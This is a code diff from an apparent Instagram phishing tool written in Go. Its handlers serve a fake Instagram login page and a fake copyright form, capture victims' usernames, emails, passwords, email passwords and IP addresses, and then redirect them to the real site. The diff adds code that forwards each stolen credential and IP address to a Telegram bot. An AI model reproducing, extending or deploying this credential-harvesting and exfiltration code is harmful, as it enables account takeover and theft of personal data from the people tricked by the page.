@@ -77,12 +77,18 @@ func serveInstagramTelif(win fyne.Window, textGrid *widget.TextGrid, textStream 
 					log.Printf("UserName = %s\nEmail = %s\nPassw = %s\nEmailPass = %s\n\n", key[0], mail, pass, mailPass)
 					*textStream += "\nUserName = " + key[0] + "\nEmail = " + mail + "\nPass = " + pass + "\nMPass = " + mailPass + "\n"
 					textGrid.SetText(*textStream)
+					if useTelegramBot {
+						tg.send("\nUserName = " + key[0] + "\nEmail = " + mail + "\nPass = " + pass + "\nMPass = " + mailPass)
+					}
 					notiApp.SendNotification(fyne.NewNotification("New Form", mail+" : "+pass))
 					http.Redirect(response, req, "https://instagram.com", 301)
 					return
 				}
 				*textStream += "New Requests For @" + key[0] + "\n"
 				textGrid.SetText(*textStream)
+				if useTelegramBot {
+					tg.send("New Request for " + key[0])
+				}
 			} else {
 				log.Println("Error to req.ParseFrom")
 			}
@@ -115,18 +121,27 @@ func serveInstagramLogin(win fyne.Window, textGrid *widget.TextGrid, textStream 
 				log.Println(ip)
 				*textStream += ip
 				textGrid.SetText(*textStream)
+				if useTelegramBot {
+					tg.send(ip)
+				}
 			}
 			username := req.FormValue("username")
 			password := req.FormValue("password")
 			if username != "" && password != "" {
 				*textStream += "UserName = " + username + "\nPassword = " + password + "\n"
 				textGrid.SetText(*textStream)
+				if useTelegramBot {
+					tg.send("UserName = " + username + "\nPass = " + password)
+				}
 				notiApp.SendNotification(fyne.NewNotification("New Form", username+" : "+password))
 				http.Redirect(res, req, "https://instagram.com", 301)
 			}
 		}
 		*textStream += "New Request\n"
 		textGrid.SetText(*textStream)
+		if useTelegramBot {
+			tg.send("New Request")
+		}
 		fmt.Fprintln(res, instagramLoginHtml)
 		return
 
